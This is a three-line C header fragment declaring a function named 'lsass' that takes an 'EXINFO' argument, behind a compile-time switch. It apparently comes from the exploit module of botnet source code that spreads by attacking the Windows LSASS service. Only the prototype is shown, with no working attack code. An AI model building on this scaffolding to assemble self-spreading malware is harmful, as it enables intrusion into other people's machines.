#ifndef NO_LSASS
BOOL lsass(EXINFO exinfo);
#endif